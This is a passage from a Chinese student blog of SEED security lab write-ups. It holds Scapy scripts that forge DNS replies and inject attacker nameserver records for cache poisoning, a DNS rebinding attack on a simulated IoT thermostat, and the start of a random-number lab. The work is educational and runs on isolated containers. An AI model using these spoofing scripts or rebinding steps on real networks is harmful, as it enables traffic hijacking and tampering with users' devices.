class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;2.2.2.2&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">0</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        <span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">        f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">        pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure>



<p>Task3</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;3.3.3.3&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Authority Section</span></span><br><span class="line">        NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">1</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec,ns=NSsec1)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        <span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">        f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">        pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>Task4</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;4.4.4.4&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Authority Section</span></span><br><span class="line">        NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        NSsec2 = DNSRR(rrname=<span class="string">&#x27;google.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">0</span>,</span><br><span class="line">                     an=Anssec,ns=NSsec1/NSsec2)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        spoofpkt.show() <span class="comment"># show spoof pkt</span></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br></pre></td></tr></table></figure>



<p>Task5</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">    <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        pkt.show() <span class="comment"># print</span></span><br><span class="line">        <span class="comment"># Swap the source and destination IP address</span></span><br><span class="line">        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">        <span class="comment"># Swap the source and destination port number</span></span><br><span class="line">        UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line">        <span class="comment"># The Answer Section</span></span><br><span class="line">        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;5.5.5.5&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Authority Section</span></span><br><span class="line">        NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com.&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        NSsec2 = DNSRR(rrname=<span class="string">&#x27;example.com.&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>,</span><br><span class="line">                       ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.example.com&#x27;</span>)</span><br><span class="line">        <span class="comment"># The Additional Section</span></span><br><span class="line">        Addsec1 = DNSRR(rrname=<span class="string">&#x27;ns.attacker32.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                        ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">        Addsec2 = DNSRR(rrname=<span class="string">&#x27;ns.example.net&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                        ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;5.6.7.8&#x27;</span>)</span><br><span class="line">        Addsec3 = DNSRR(rrname=<span class="string">&#x27;www.facebook.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">                        ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;3.4.5.6&#x27;</span>)</span><br><span class="line">        <span class="comment"># Construct the DNS packet</span></span><br><span class="line">        DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>,</span><br><span class="line">                     qdcount=<span class="number">1</span>, ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">3</span>,</span><br><span class="line">                     an=Anssec,ns=NSsec1/NSsec2,ar=Addsec1/Addsec2/Addsec3)</span><br><span class="line">        <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">        spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">        send(spoofpkt)</span><br><span class="line">        spoofpkt.show() <span class="comment"># show spoof pkt</span></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and src host 10.9.0.53 and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-579a2284e98b&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns) </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>seedlab2.0</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/09/18/DNS_rebind/</url>
    <content><![CDATA[<hr>
<p>title: DNS Rebinding Attack Lab<br>date: 2022-12-5<br>categories: 网络安全<br>tags: seedlab2.0</p>
<hr>
<h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>本实验室的目标有两个:(1)演示DNS重绑定攻击是如何工作的，(2)提供帮助学生获得如何使用DNS重绑定技术攻击物联网设备的第一手经验。在在设置中，我们有一个模拟物联网设备，它可以通过一个web界面进行控制(这是典型的许多物联网设备)。即使攻击者可以，许多物联网设备也没有强大的保护机制直接与他们互动，他们可以很容易地破坏这些设备。</p>
<span id="more"></span>
<p>在这个实验室中模拟的物联网设备是一个恒温器，它可以控制房间的温度。成攻设置温度后，客户端需要能够与物联网服务器进行交互。因为物联网设备防火墙后，外部机器不能与物联网设备交互，因此不能控制恒温器。为了突破防火墙的保护，攻击代码必须进入内部首先网络。这并不难。当来自内部网络的用户访问攻击者的任何时间网站，攻击者的代码(JavaScript代码)实际上是从用户的浏览器运行的，因此在浏览器内部运行受保护的内部网络。但是，由于浏览器实现了沙盒保护，因此攻击者的代码仍然不能与物联网设备交互，即使它现在在内部网络中。</p>
<p>本实验室的目的是利用DNS重绑定攻击来绕过沙盒保护，因此攻击者的JavaScript代码可以成功获取物联网设备的基本信息然后利用这些信息将恒温器的温度设置到一个危险的高值。这个实验室涵盖了以下主题:</p>
<p>•DNS服务器设置</p>
<p>•DNS重绑定攻击</p>
<p>•攻击物联网设备</p>
<p>•同源政策</p>
<h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><h3 id="2-1-DNS协议"><a href="#2-1-DNS协议" class="headerlink" title="2.1 DNS协议"></a>2.1 DNS协议</h3><p>域名系统（英语：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53[1]。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p>
<h3 id="2-2-同源策略"><a href="#2-2-同源策略" class="headerlink" title="2.2 同源策略"></a>2.2 同源策略</h3><p>在Web浏览器中，允许某个网页脚本访问另一个网页的数据，但前提是这两个网页必须有相同的URI、主机名和端口号，一旦两个网站满足上述条件，这两个网站就被认定为具有相同来源。此策略可防止某个网页上的恶意脚本通过该页面的文档对象模型访问另一网页上的敏感数据。</p>
<p>同源策略对Web应用程序具有特殊意义，因为Web应用程序广泛依赖于HTTP cookie来维持用户会话，所以必须将不相关网站严格分隔，以防止丢失数据泄露。</p>
<p>值得注意的是同源策略仅适用于脚本，这意味着某网站可以通过相应的HTML标签访问不同来源网站上的图像、CSS和动态加载脚本等资源。而跨站请求伪造就是利用同源策略不适用于HTML标签的缺陷。</p>
<h3 id="2-3-拓扑搭建"><a href="#2-3-拓扑搭建" class="headerlink" title="2.3 拓扑搭建"></a>2.3 拓扑搭建</h3><p>DNS重新绑定攻击的网络拓扑如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181028470.png"></p>
<p>在这个实验室里，我们将使用六台机器。实验环境设置如图1所示。只有用户机器将使用VM，其他的都是容器。在设置中，我们有两个网络，一个家庭网络和外部网络。家庭网络模拟了一个典型的家庭网络。User机器物联网服务连接到该网络，该网络由路由器容器上的防火墙保护。防火墙会阻止所有到达192.168.60.80的流量。这样，外部机器就不能访问物联网设备。我们还在路由器上设置了一个NAT服务器，这样家庭网络中的机器就可以访问外部(回复包可以返回)。</p>
<p>第二个网络模拟外部网域。除了路由器之外，还有三个容器连接到这个网络，一个作为本地DNS服务器，另外两个作为攻击者的名称服务器和web服务器。攻击者拥有attacker32.com域，它由攻击者的命名服务器容器。该web服务器上有一个用于攻击的恶意网站。</p>
<h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu20.04。</p>
<p>2．Docker.</p>
<h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-实验环境配置"><a href="#4-1-实验环境配置" class="headerlink" title="4.1 实验环境配置"></a>4.1 实验环境配置</h3><h4 id="4-1-1-减少Firefox的DNS缓存时间"><a href="#4-1-1-减少Firefox的DNS缓存时间" class="headerlink" title="4.1.1 减少Firefox的DNS缓存时间"></a>4.1.1 减少Firefox的DNS缓存时间</h4><p>减少DNS服务器的负载，加快响应速度时间，Firefox浏览器缓存DNS结果。缺省情况下，缓存过期时间为60秒。这意味着我们的DNS重绑定攻击需要等待至少60秒。为了使我们实验更容易，我们减少了时间为10秒或更短。在URL字段中输入about:config。在点击一个警告页面后，我们将看到首选项名称及其值的列表。搜索dnsCache，找到以下条目和改变它的值。修改如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181029706.png"></p>
<h4 id="4-1-2-修改-x2F-etc-x2F-host文件"><a href="#4-1-2-修改-x2F-etc-x2F-host文件" class="headerlink" title="4.1.2 修改&#x2F;etc&#x2F;host文件"></a>4.1.2 修改&#x2F;etc&#x2F;host文件</h4><p>我们需要在&#x2F;etc&#x2F;hosts文件中添加以下条目。我们将使用<a href="http://www.seedIoT32.com作为物联网服务器的名称。IP地址为192.168.60.80">www.seedIoT32.com作为物联网服务器的名称。IP地址为192.168.60.80</a></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181029139.png"></p>
<h4 id="4-1-3-本地DNS服务"><a href="#4-1-3-本地DNS服务" class="headerlink" title="4.1.3 本地DNS服务"></a>4.1.3 本地DNS服务</h4><p>我们需要让User VM使用特定的本地DNS服务器。这是通过将本地DNS服务器设置为解析器配置文件中的第一个名称服务器条目来实现(&#x2F; etc &#x2F; resolv.conf)。一个挑战是所提供的虚拟机使用动态主机配置通过DHCP协议获取网络配置参数，如IP地址、本地DNS服务器等。DHCP客户端使用DHCP服务器提供的信息覆盖&#x2F;etc&#x2F;resolv.conf文件。将信息放入&#x2F;etc&#x2F;resolv.conf而不用担心DHCP的一种方法是to</p>
<p>在&#x2F;etc&#x2F;resolvconf&#x2F;resolv.conf文件中添加以下条目。D &#x2F;头文件(10.9.0.53是本地DNS服务器的IP地址)。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181030382.png"></p>
<h4 id="4-1-4-测试实验配置"><a href="#4-1-4-测试实验配置" class="headerlink" title="4.1.4 测试实验配置"></a>4.1.4 测试实验配置</h4><p>配置完User虚拟机后，使用dig命令获取<a href="http://www.attacker32.com的ip地址和ns.attacker32.com.你应该分别得到10.9.0.180和10.9.0.153.如果你有不明白这个,你的实验室环境没有正确设置.我们现在可以测试攻击者的网站了.将浏览器指向user/">www.attacker32.com的IP地址和ns.attacker32.com。你应该分别得到10.9.0.180和10.9.0.153。如果你有不明白这个，你的实验室环境没有正确设置。我们现在可以测试攻击者的网站了。将浏览器指向User</a> VM上的以下URL，然后你应该能够看到攻击者的网站。请在你的实验报告中提供一个截图。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181030173.png"></p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181030846.png"></p>
<p>攻击者网站的内容如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181031002.png"></p>
<p>说明实验配置搭建成功。</p>
<h3 id="4-2-在物联网设备上进行攻击"><a href="#4-2-在物联网设备上进行攻击" class="headerlink" title="4.2 在物联网设备上进行攻击"></a>4.2 在物联网设备上进行攻击</h3><h4 id="4-2-1-理解同源策略保护机制"><a href="#4-2-1-理解同源策略保护机制" class="headerlink" title="4.2.1 理解同源策略保护机制"></a>4.2.1 理解同源策略保护机制</h4><p>在本任务中，我们将做一些实验来了解实现的同源策略保护浏览器。点击第二页和第三页的按钮，描述你的观察。哪个页面可以成功设定恒温器的温度?请解释原因。要查找原因，请单击下面的菜单序列从Firefox。将出现一个控制台窗口，其中显示错误消息(如果有的话)。提示:原因与浏览器强制的同源策略有关。请解释为什么这个政策会导致一个失败的页面。</p>
<p>首先在<a href="http://www.seediot32.com/change">http://www.seedIoT32.com/change</a> 网站中点击按钮，可以发现温度被成功修改，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181032825.png"></p>
<p>利用浏览器中的工具，可以观察到下列报文：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181032446.png"></p>
<p>可以观察到他们都有正确的password，并且报文的来源ip地址与物联网设备的ip地址相同。</p>
<p>然后在攻击者的网站<a href="http://www.attacker32.com/change">http://www.attacker32.com/change</a> 中点击按钮，发现该设备的温度并不会发生改变，并且利用火狐浏览器中的工具，可以捕获到以下的报错内容。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181033240.png"></p>
<p>可以观察到GET报文中报错cross-origin request blocked</p>
<p>Reason: CORS header ‘Access-Control-Allow-Origin’ missing 经过查询可以得知原因在于对于跨站请求的响应缺少必须的Access-Control-Allow-Origin报头，而该报头用于确定当前站点源内的操作是否可以访问目的网站。这便是同源策略进行保护的原理所在。</p>
<h4 id="4-2-2-打破同源策略保护机制"><a href="#4-2-2-打破同源策略保护机制" class="headerlink" title="4.2.2 打破同源策略保护机制"></a>4.2.2 打破同源策略保护机制</h4><p>从前面的任务来看，从攻击者的页面设置恒温器的温度似乎是不可能的到浏览器的同源策略保护。这项任务的目的就是要摧毁这种保护，所以我们可以从这一页设定温度。打击原产地保护的主要思路来自于政策的实施是基于主机名，而不是IP地址，所以只要我们在URL，我们遵守SOP政策，但这并不意味着我们被限制与<a href="http://www.attacker32.com/">www.attacker32.com</a> web服务器。在用户的浏览器向<a href="http://www.attacker32.com发送请求之前，它首先需要知道IP地址:www.attacker32.com。一个DNS请求将从用户的机器发出。如果IP地址没有缓存到本地DNS服务器，DNS请求最终将被发送attacker32.com的名称服务器，由攻击者控制。因此，攻击者可以决定在响应中放入什么。">www.attacker32.com发送请求之前，它首先需要知道IP地址:www.attacker32.com。一个DNS请求将从用户的机器发出。如果IP地址没有缓存到本地DNS服务器，DNS请求最终将被发送attacker32.com的名称服务器，由攻击者控制。因此，攻击者可以决定在响应中放入什么。</a></p>
<p>攻击步骤如下：</p>
<p>Step1：修改JavaScript代码</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181035604.png"></p>
<p>成功修改后，重新打开攻击者的页面，并且点击按钮，发现仍然报错，如下所示：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181035646.png"></p>
<p>原因在于未定义password。</p>
<p>Step2：进行DNS重新绑定</p>
<p>我们的JavaScript代码将请求发送到<a href="http://www.attacker32.com,也就是说,请求将返回到攻击者的web服务器.这不是我们想要的;我们想要请求到物联网服务器.这可以通过dns重绑定技术实现.我们首先绘制映射www.attacker32.com到攻击者的web服务器的ip地址,这样用户就可以获得实际的页面从http//www.attacker32.com/change%E3%80%82%E5%9C%A8%E7%82%B9%E5%87%BB%E9%A1%B5%E9%9D%A2%E4%B8%8A%E7%9A%84%E6%8C%89%E9%92%AE%E4%B9%8B%E5%89%8D%EF%BC%8C%E6%88%91%E4%BB%AC%E8%A6%81%E9%87%8D%E6%96%B0%E6%98%A0%E5%B0%84">www.attacker32.com，也就是说，请求将返回到攻击者的web服务器。这不是我们想要的;我们想要请求到物联网服务器。这可以通过DNS重绑定技术实现。我们首先绘制映射www.attacker32.com到攻击者的web服务器的IP地址，这样用户就可以获得实际的页面从http://www.attacker32.com/change。在点击页面上的按钮之前，我们要重新映射</a></p>
<p>将<a href="http://www.attacker32.com主机名设置为物联网服务器的ip地址,因此该请求由按钮将转到物联网服务器.这正是我们想要的./">www.attacker32.com主机名设置为物联网服务器的IP地址，因此该请求由按钮将转到物联网服务器。这正是我们想要的。</a></p>
<p>根据实验手册中的指导，我们可以进行如下攻击：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181037963.png"></p>
<p>首先在攻击者的域名服务器上修改默认的TTL响应时间，应该设置一个较小的值，然后将www的DNS解析绑定为物联网设备的IP地址</p>
<p>然后清除本地DNS的缓存</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181037255.png"></p>
<p>此处重新绑定DNS时，应该是在打开攻击者页面，点击按钮之前，否则攻击就会失败。</p>
<p>然后再攻击者页面中点击按钮，可以观察到如下内容：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181037029.png"></p>
<p>可以发现攻击者所发送的报文中有正确的password，其报文也成功被物联网设备所接收，修改其温度为99℃。</p>
<p>在物联网设备的页面也可以观察到其温度被修改，并且来自于攻击者网站的请求报文。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181037955.png"></p>
<p>攻击成功</p>
<h4 id="4-2-3-自动进行攻击"><a href="#4-2-3-自动进行攻击" class="headerlink" title="4.2.3 自动进行攻击"></a>4.2.3 自动进行攻击</h4><p>在前面的任务中，用户必须单击按钮将温度设置为危险的高值。显然，用户不太可能这么做。在这个任务中，我们需要自动完成。我们有已经为此创建了一个网页将此页面加载到User VM后，应该能够看到一个带有计时器的页面从10降到0。一旦它达到0，该页上的JavaScript代码将发送设置温度请求<a href="http://www.attacker32.com,然后将计时器值重置为10.学生需要使用dns重绑定技术,所以一旦计时器达到0,恒温器的温度被设置为88摄氏度./">http://www.attacker32.com，然后将计时器值重置为10。学生需要使用DNS重绑定技术，所以一旦计时器达到0，恒温器的温度被设置为88摄氏度。</a></p>
<p>攻击过程同上，使用DNS重新绑定的方法，需要在页面的计时器数到0的时候进行重新绑定，即可在该页面实现其自动攻击</p>
<p>如下图所示：</p>
<p>攻击者的页面内容发生改变，证明其已经连接到了物联网设备</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181038265.png"></p>
<p>在物联网设备的页面，可以观察到其不断收到来自于攻击者网站的请求，使其温度修改到88℃，证明攻击成功。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309181038880.png"></p>
]]></content>
  </entry>
  <entry>
    <title>伪随机数生成 Lab</title>
    <url>/2022/12/14/Pseudo-random%20Number/</url>
    <content><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>生成随机数是安全软件中非常常见的任务。在许多情况下，加密密钥不是由用户提供的，而是在软件内部生成的。它们的随机性非常重要。否则，攻击者可以预测加密密钥，从而达到破坏加密目的。许多开发人员从其先前的经验中知道如何生成随机数（例如用于蒙特卡洛模拟），因此他们使用类似的方法生成用于安全目的的随机数。不幸的是，随机数序列对于蒙特卡洛模拟可能是好的，但对于加密密钥则可能是不好的。开发人员需要知道如何生成安全的随机数，否则就会犯错。在一些著名的产品（包括Netscape和Kerberos ）中也犯过类似的错误。</p>
<span id="more"></span>
<p>在本实验中，学生将学习为什么典型的随机数生成方法不适用于生成秘密（例如加密密钥）。进一步学习生成用于安全目的的伪随机数的标准方法。本实验涵盖以下主题：</p>
<p>1. 伪随机数生成</p>
<p>2. 随机数生成中的错误</p>
<p>3. 加密密钥生成</p>
<p>4. 设备文件&#x2F;dev&#x2F;random 和&#x2F;dev&#x2F;urandom</p>
<h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：用错误的方式生成加密密钥"><a href="#2-1-Task-1：用错误的方式生成加密密钥" class="headerlink" title="2.1 Task 1：用错误的方式生成加密密钥"></a>2.1 Task 1：用错误的方式生成加密密钥</h3><p>要生成一个好的伪随机数，我们需要从一些随机的东西开始。否则，结果会是可预测的。库函数time() 以从纪元1970-01-01 00:00:00 +0000 (UTC) 起的秒数的形式返回当前时间。运行上面的代码，并描述你的观察结果。然后，注释掉第À 行，再次运行该程序，并描述你观察到的结果。使用在两种情况下观察到的结果来解释代码中srand() 和time() 函数的用途。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150915034.png"></p>
<p>注释前如上图所示，每次生成的随机数不同。</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150917202.png"></p>
<p>注释掉后如上图所示，每次生成的随机数相同</p>
<p>解释：</p>
<p>srand函数用于给随机数生成器根据当前系统时间设定种子，而将该函数注释掉后，会默认使用随机数种子0，因此会产生两种不同的观察结果。</p>
<h3 id="2-2-Task-2-猜测密钥"><a href="#2-2-Task-2-猜测密钥" class="headerlink" title="2.2 Task 2: 猜测密钥"></a>2.2 Task 2: 猜测密钥</h3><p>给定以AES—CBC模式加密的明文，密文以及初始IV如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150917199.png"></p>
<p>编写一个程序用于尝试所有可能的密钥。密钥生成方式由TASK1给出。</p>
<p>思路：</p>
<p>首先利用task1中所给出的代码进行改写，根据所给出时间的及其前两个小时的时间种子来生成128bit长度的密钥，然后再编写脚本来遍历所生成的密钥，利用AES进行加密明文，如过加密后的密文与给出的密文相同，则得到正确的密钥。</p>
<p>首先查看时间如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150917950.png"></p>
<p>利用时间种子进行生成密钥，并保存在文件中。</p>
<p>代码如下图：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150918752.png"></p>
<p>生成结果如下，可以观察到生成了16bytes长的密钥如下：</p>
<p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309150918380.png"></p>
<p>编写python脚本如下：</p>
